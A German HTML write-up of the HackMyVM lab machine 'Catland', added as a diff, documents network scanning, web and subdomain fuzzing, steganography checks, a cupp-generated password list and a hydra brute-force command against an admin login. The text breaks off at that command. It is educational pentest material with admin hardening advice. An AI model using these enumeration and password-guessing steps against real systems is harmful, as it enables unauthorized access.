@@ -1,0 +1,1151 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Catland - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Catland - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+             <h2 class="difficulty-medium">Medium</h2> <!-- Klasse für Gelb -->
+             <div class="circle">
+                 <div class="segment segment-1"></div>
+                 <div class="segment segment-2"></div>
+                 <div class="segment segment-3"></div>
+                 <div class="inner"></div>
+             </div>
+         </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">exiftool</div>
+                <div class="tool-item">steghide</div>
+                <div class="tool-item">stegsnow</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">cupp</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">zip (impliziert)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">ls</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#steganography-attempts">Steganographie-Versuche</a></li>
+                <li><a href="#subdomain-enumeration">Subdomain Enumeration</a></li>
+                <li><a href="#admin-panel-enumeration">Admin Panel Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#poc">Proof of Concept (Initial Access via LFI & Zip Upload)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.126</span>	08:00:27:27:c0:41	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `arp-scan -l` wird ausgeführt, um aktive Hosts im lokalen Netzwerk zu finden. Ein Host mit der IP `192.168.2.126` und der MAC `08:00:27:27:c0:41` (VirtualBox) wird entdeckt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem wurde erfolgreich identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie einen Portscan mit Nmap auf die IP `192.168.2.126` durch. Fügen Sie optional einen Hostnamen (z.B. `catland.hmv`) zur `/etc/hosts`-Datei hinzu.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und ARP-Scan-Erkennung können die Aufklärung erschweren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -AO 192.168.2.126 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 22:10 CEST
+Nmap scan report for catland.hmv (192.168.2.126)
+Host is up (0.00016s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+| ssh-hostkey:
+|   3072 c71014a89af0251e0db1c66f1ca188d8 (RSA)
+|   256 1b66f4e5b6236e778e9ec178c5bcace9 (ECDSA)
+|_  256 f4e9d87a0815d0929014dfb3ec81a1ed (ED25519)
+<span class="command">80/tcp open  http    Apache httpd 2.4.54 ((Debian))</span>
+|_http-title: Catland
+|_http-server-header: Apache/2.4.54 (Debian)
+MAC Address: 08:00:27:27:C0:41 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.16 ms catland.hmv (192.168.2.126)
+
+Nmap done: 1 IP address (1 host up) scanned in 15.81 seconds
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-sS -sC -sV -T5 -A -p-`) wird auf das Ziel durchgeführt. Die Ergebnisse zeigen:
+                *   Port 22 (SSH): Offen, OpenSSH 8.4p1 auf Debian. Verschiedene Host-Schlüssel werden angezeigt.
+                *   Port 80 (HTTP): Offen, Apache 2.4.54 auf Debian. Der Titel der Webseite ist "Catland".
+                *   OS-Erkennung: Schätzt Linux Kernel 4.15 - 5.6.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Hauptangriffsvektoren sind SSH und HTTP. Die Versionsinformationen für SSH und Apache sind nützlich für die Schwachstellensuche.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf die Enumeration des Webservers (Port 80). Überprüfen Sie bekannte Schwachstellen für OpenSSH 8.4p1 und Apache 2.4.54.<br><strong>Empfehlung (Admin):</strong> Halten Sie SSH- und Webserver-Software aktuell. Konfigurieren Sie SSH sicher (z.B. Key-Authentifizierung bevorzugen, Passwort-Auth deaktivieren). Implementieren Sie eine Firewall.</p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.126 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -b '403,404' -e -t 100 -n -k</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.126
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.1.0
+[+] Expanded:                true
+[+] Extensions:              [...] <span class="comment"><!-- Lange Liste --></span>
+[+] No status:               true
+[+] Ignore SSL:              true
+[+] Timeout:                 10s
+===============================================================
+2023/04/10 22:12:01 Starting gobuster
+===============================================================
+/<span class="command">index.php</span>            (Status: 200) [Size: 757]
+/<span class="command">logo.jpeg</span>            (Status: 200) [Size: 7834]
+/<span class="command">logo.png</span>             (Status: 200) [Size: 232884]
+/<span class="command">images</span>               (Status: 301) [Size: 315] [--> http://192.168.2.126/images/]
+/<span class="command">gallery.php</span>          (Status: 200) [Size: 479]
+===============================================================
+2023/04/10 22:13:55 Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein `gobuster`-Scan wird mit einer umfangreichen Liste von Dateierweiterungen (`-x ...`), hoher Thread-Anzahl (`-t 100`) und einer mittelgroßen Wortliste durchgeführt. Statuscodes 403/404 werden ignoriert (`-b '403,404'`).
+            Funde:
+                *   `index.php`: Hauptseite.
+                *   `logo.jpeg`, `logo.png`: Bilddateien.
+                *   `/images`: Verzeichnis (leitet auf `/images/` weiter).
+                *   `gallery.php`: Eine weitere PHP-Datei.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert grundlegende Dateien und Verzeichnisse. Die Bilddateien und `gallery.php` sind potenzielle Untersuchungsziele.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Bilddateien auf Metadaten oder Steganographie. Analysieren Sie `gallery.php` auf Schwachstellen (z.B. LFI, SQLi, XSS). Überprüfen Sie den Inhalt des `/images`-Verzeichnisses.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie die Verzeichnisauflistung. Stellen Sie sicher, dass keine sensiblen Informationen in öffentlich zugänglichen Dateien oder Verzeichnissen vorhanden sind.</p>
+
+        </section>
+
+        <section id="steganography-attempts">
+            <h2>Steganographie-Versuche</h2>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">exiftool logo.jpeg</span></div>
+                    <pre>
+ExifTool Version Number         : 12.57
+File Name                       : logo.jpeg
+[...] <span class="comment"><!-- Standard-Metadaten --></span>
+Image Size                      : 225x225
+Megapixels                      : 0.051
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `exiftool` wird verwendet, um Metadaten aus `logo.jpeg` zu extrahieren.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Es werden nur Standard-Metadaten ohne versteckte Informationen gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie andere Steganographie-Tools.<br><strong>Empfehlung (Admin):</strong> Metadaten sind hier unbedenklich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">steghide extract -sf logo.jpeg</span></div>
+                    <pre>
+Passwort eingeben: <span class="comment">[Kein Passwort gefunden/eingegeben]</span>
+<span class="password">steghide: could not extract any data with that passphrase!.</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Versuch, mit `steghide` versteckte Daten aus `logo.jpeg` zu extrahieren. Ein Passwort wird benötigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ohne Passwort ist die Extraktion nicht erfolgreich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegsnow -C logo.jpeg</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Versuch, mit `stegsnow` (ein Tool für Steganographie in Whitespace) versteckte Daten zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Keine Daten gefunden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegseek logo.jpeg /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Progress: 99.32% (132.5 MB)
+<span class="password">[!] error: Could not find a valid passphrase.</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `stegseek` versucht, das `steghide`-Passwort für `logo.jpeg` mithilfe der `rockyou.txt`-Wortliste zu knacken.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Brute-Force-Versuch war erfolglos; das Passwort befindet sich nicht in `rockyou.txt`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Steganographie in `logo.jpeg` scheint kein vielversprechender Weg zu sein. Untersuchen Sie andere gefundene Dateien/Pfade.<br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen erforderlich, aber seien Sie sich bewusst, dass Steganographie existiert.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.2.126/index.php?FUZZ=id" --hw 97</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.2.126/index.php?FUZZ=id
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+<span class="comment">[Keine Ergebnisse]</span>
+Total time: ...
+Processed Requests: 220560
+Filtered Requests: 220560
+Requests/sec.: ...
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Versuch, mit `wfuzz` einen funktionierenden GET-Parameter für `index.php` zu finden, der möglicherweise eine Schwachstelle (z.B. LFI, Command Injection) auslöst. Es wird versucht, den Befehl `id` auszuführen. Antworten mit 97 Wörtern (`--hw 97` - wahrscheinlich die Standard-Antwortlänge) werden herausgefiltert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Keine abweichenden Antworten gefunden. `index.php` scheint nicht direkt über unbekannte GET-Parameter angreifbar zu sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie andere Dateien (`gallery.php`) oder Methoden (POST-Parameter, Header).<br><strong>Empfehlung (Admin):</strong> Input-Validierung für alle Parameter implementieren.</p>
+
+             <p class="analysis"><strong>Analyse (Impliziert):</strong> An dieser Stelle wurde vermutlich das Verzeichnis `/images` manuell untersucht und die Datei `laura-with-cat.jpeg` gefunden, da im Folgenden Steganographie-Versuche darauf angewendet werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">steghide extract -sf laura-with-cat.jpeg</span></div>
+                    <pre>
+Passwort eingeben: <span class="comment">[Kein Passwort gefunden/eingegeben]</span>
+<span class="password">steghide: could not extract any data with that passphrase!.</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Erneuter `steghide`-Versuch, diesmal auf `laura-with-cat.jpeg`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolglos ohne Passwort.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegsnow -C laura-with-cat.jpeg</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `stegsnow`-Versuch auf `laura-with-cat.jpeg`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolglos.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegseek laura-with-cat.jpeg /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Progress: 99.71% (133.1 MB)
+<span class="password">[!] error: Could not find a valid passphrase.</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `stegseek`-Versuch auf `laura-with-cat.jpeg` mit `rockyou.txt`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolglos.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Steganographie scheint auch hier keine Informationen preiszugeben. Notieren Sie sich jedoch den Namen `laura` aus dem Dateinamen als potenziellen Benutzernamen.<br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.2.126/gallery.php?FUZZ=id" --hh 479</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.2.126/gallery.php?FUZZ=id
+Total requests: 220560
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+<span class="comment">[Keine Ergebnisse]</span>
+
+Total time: ...
+Processed Requests: 220560
+Filtered Requests: 220560
+Requests/sec.: ...
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Versuch, mit `wfuzz` einen funktionierenden GET-Parameter für `gallery.php` zu finden. Antworten mit 479 Zeichen (`--hh 479` - vermutlich die Standardantwort) werden herausgefiltert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Keine abweichenden Antworten gefunden. `gallery.php` scheint nicht über unbekannte GET-Parameter angreifbar zu sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie `gallery.php` manuell oder mit anderen Tools auf Schwachstellen.<br><strong>Empfehlung (Admin):</strong> Input-Validierung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.126 -C all</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.126
++ Target Hostname:    192.168.2.126
++ Target Port:        80
++ Start Time:         2023-04-10 22:20:13 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.54 (Debian)
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ <span class="password">/images/: Directory indexing found.</span>
++ 26640 requests: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           2023-04-10 22:21:40 (GMT2) (87 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein erneuter `nikto`-Scan, diesmal mit der Option `-C all`, um alle CGI-Verzeichnisse zu prüfen. Findet erneut die fehlenden Sicherheitsheader und die Verzeichnisauflistung für `/images`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt frühere Funde, liefert aber keine neuen kritischen Informationen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die fehlenden Header sind von geringer Priorität. Die Verzeichnisauflistung wurde bereits zur Kenntnis genommen.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`). Deaktivieren Sie die Verzeichnisauflistung.</p>
+
+        </section>
+
+        <section id="subdomain-enumeration">
+            <h2>Subdomain Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://catland.hmv -H "Host: FUZZ.catland.hmv" --hh 757 --hc 400,403,404</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://catland.hmv/
+Total requests: 110000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="password">000000024:   200        23 L     90 W       1068 Ch     "admin"</span>
+
+Total time: ...
+Processed Requests: ...
+Filtered Requests: ...
+Requests/sec.: ...
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird zur Subdomain-Enumeration mittels VHost-Brute-Forcing verwendet.
+                *   `-w ...subdomains-top1million-110000.txt`: Verwendet eine Liste gängiger Subdomains.
+                *   `-u http://catland.hmv`: Die Basis-URL (Ziel-IP).
+                *   `-H "Host: FUZZ.catland.hmv"`: Setzt den HTTP-Host-Header dynamisch. `FUZZ` wird durch die Einträge aus der Wortliste ersetzt.
+                *   `--hh 757`: Versteckt Antworten mit 757 Zeichen (wahrscheinlich die Größe der Standardseite `index.php`).
+                *   `--hc 400,403,404`: Versteckt Standardfehlercodes.
+            Der Scan findet eine Subdomain: `admin.catland.hmv`, die eine andere Antwort (1068 Chars) als die Hauptseite liefert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Hervorragender Fund! Eine versteckte `admin`-Subdomain wurde entdeckt, die wahrscheinlich ein Login-Panel oder administrative Funktionen beherbergt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fügen Sie `admin.catland.hmv` zur `/etc/hosts`-Datei hinzu. Rufen Sie die Subdomain im Browser oder mit `curl` auf und untersuchen Sie sie auf Login-Formulare oder Schwachstellen.<br><strong>Empfehlung (Admin):</strong> Beschränken Sie den Zugriff auf administrative Subdomains (z.B. über IP-Whitelisting, VPN, Authentifizierung auf Webserver-Ebene). Verwenden Sie keine leicht zu erratenden Subdomain-Namen.</p>
+        </section>
+
+        <section id="admin-panel-enumeration">
+            <h2>Admin Panel Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/usr/share/seclists/Fuzzing/LFI] <span class="comment"><!-- Pfad gewechselt, aber nicht relevant für den Befehl --></span>
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+<span class="command">192.168.2.126    admin.catland.hmv</span> <span class="comment"><!-- Eintrag hinzugefügt --></span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die `/etc/hosts`-Datei wird bearbeitet, um die gefundene Subdomain `admin.catland.hmv` der IP-Adresse `192.168.2.126` zuzuordnen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Schritt, um die Subdomain über ihren Namen aufrufen zu können.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://admin.catland.hmv/</span></div>
+                    <pre>
+ Admin panel 
+ Login: 
+ Password: 
+ Invalid username or password <span class="comment"><!-- Fehlermeldung nach POST? --></span>
+ 
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `curl` wird verwendet, um den Quellcode der Startseite von `admin.catland.hmv` abzurufen. Der Code zeigt ein einfaches HTML-Login-Formular mit Feldern für `username` und `password`. Die `action` des Formulars ist leer (`action=""`), was bedeutet, dass die Daten an dieselbe Seite (`index.php` oder die aktuelle URL) per POST gesendet werden. Es wird auch ein JavaScript (`redirect.js`) eingebunden, das versucht, den Benutzer umzuleiten. Die Meldung "Invalid username or password" ist im HTML vorhanden, was darauf hindeutet, dass sie möglicherweise standardmäßig angezeigt wird oder nach einem fehlgeschlagenen POST-Versuch im selben Request.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Admin-Panel ist identifiziert und zeigt ein klares Login-Formular. Die leere `action` und die Fehlermeldung sind wichtige Informationen für einen Brute-Force-Angriff.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie einen Brute-Force-Angriff auf das Login-Formular mit Tools wie Hydra. Beachten Sie die Parameter (`username`, `password`) und die Fehlermeldung (`Invalid username or password`). Deaktivieren Sie JavaScript im Browser oder verwenden Sie `curl`, um den Redirect zu umgehen.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie Account-Lockout-Mechanismen und CAPTCHAs, um Brute-Force-Angriffe zu erschweren. Verwenden Sie starke Passwörter.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, da dies der Inhalt einer Datei ist -->
+                    <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+// Inhalt von redirect.js
+function redirectToSubdomain() {
+  window.location.replace('http://catland.hmv');
+}
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `redirect.js`, die auf der Login-Seite eingebunden ist. Die Funktion `redirectToSubdomain` leitet den Benutzer einfach zur Hauptseite `catland.hmv` um.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein einfacher Mechanismus, um nicht eingeloggte Benutzer vom Admin-Panel wegzuleiten. Er kann leicht durch Deaktivieren von JavaScript oder durch direkte Anfragen mit Tools wie `curl` umgangen werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignorieren Sie das JavaScript oder deaktivieren Sie es bei der Interaktion mit dem Admin-Panel.<br><strong>Empfehlung (Admin):</strong> Serverseitige Authentifizierung und Autorisierung sind entscheidend. Clientseitige Redirects bieten keine echte Sicherheit.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://admin.catland.hmv/index.php -I</span></div>
+                    <pre>
+HTTP/1.1 200 OK
+Date: Mon, 10 Apr 2023 20:39:29 GMT
+Server: Apache/2.4.54 (Debian)
+<span class="command">Set-Cookie: PHPSESSID=elqtqobbhnarin95sb88a0bhcc; path=/</span>
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Type: text/html; charset=UTF-8
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `curl -I` wird verwendet, um nur die HTTP-Header der Seite `http://admin.catland.hmv/index.php` abzurufen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Servertyp und zeigt, dass ein `PHPSESSID`-Cookie gesetzt wird, was auf eine PHP-basierte Anwendung hindeutet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beachten Sie das Session-Cookie bei der weiteren Interaktion.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Session-Cookies sicher konfiguriert sind (HttpOnly, Secure-Flag falls HTTPS verwendet wird).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://admin.catland.hmv/index.phps</span></div>
+                     <pre>
+403 Forbidden
+ 
+You don't have permission to access this resource.
+<hr>
+Apache/2.4.54 (Debian) Server at admin.catland.hmv Port 80
+
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Versuch, den Quellcode von `index.php` durch Anhängen von `s` (`index.phps`) abzurufen. Dies ist eine gängige Methode, wenn der Server so konfiguriert ist, dass er PHP-Quellcode bei dieser Endung anzeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Versuch schlägt mit einem `403 Forbidden`-Fehler fehl. Der Server ist nicht so konfiguriert, dass er Quellcode auf diese Weise preisgibt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach anderen Wegen, um Quellcode zu erhalten (z.B. LFI, Fehlkonfigurationen, Backups).<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Quellcode nicht unbeabsichtigt preisgegeben wird. Deaktivieren Sie Handler wie `mod_php` für `.phps`, wenn nicht benötigt.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+             <p class="analysis"><strong>Hypothese & Vorbereitung:</strong> Basierend auf dem Dateinamen `laura-with-cat.jpeg` wird vermutet, dass `laura` ein gültiger Benutzername für das Admin-Panel sein könnte. Das Tool `cupp` wird verwendet, um eine benutzerdefinierte Passwortliste basierend auf dem Namen "laura" zu erstellen.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cupp -i</span></div>
+                    <pre>
+ ___________
+   cupp.py!                 # Common
+      \                     # User
+       \   ,__,             # Passwords
+        \  (oo)____         # Profiler
+           (__)    )\
+              ||--||       [ Muris Kurgas | j0rgan@remote-exploit.org ]
+                            [ Mebus | https://github.com/Mebus/]
+
+
+[+] Insert the information about the victim to make a dictionary
+[+] If you don't know all the info, just hit enter when asked! ;)
+
+> First Name: <span class="command">laura</span>
+[...] <span class="comment"><!-- Weitere Fragen von cupp --></span>
+
+[+] Now making a dictionary...
+[+] Sorting list and removing duplicates...
+<span class="password">[+] Saving dictionary to laura.txt, counting 108 words.</span>
+[+] Now load your pistolero with laura.txt and shoot! Good luck!
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `cupp -i` (Common User Passwords Profiler) wird interaktiv ausgeführt, um eine Passwortliste zu generieren. Als Vorname wird `laura` angegeben. `cupp` erstellt daraus typische Passwortvariationen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Eine spezialisierte Wortliste (`laura.txt` mit 108 Wörtern) wurde erstellt, die gezielter ist als eine generische Liste wie `rockyou.txt` für den vermuteten Benutzer `laura`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die generierte Liste `laura.txt` für einen Brute-Force-Angriff auf das Admin-Panel mit dem Benutzernamen `laura`.<br><strong>Empfehlung (Admin):</strong> Fördern Sie die Verwendung starker, nicht vorhersagbarer Passwörter, die nicht leicht aus persönlichen Informationen abgeleitet werden können.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l laura -P laura.txt 'http-post-form://admin.catland.hmv/index.php:username=^USER^&password=^PASS^:Invalid'</span></div>
+                    <pre>
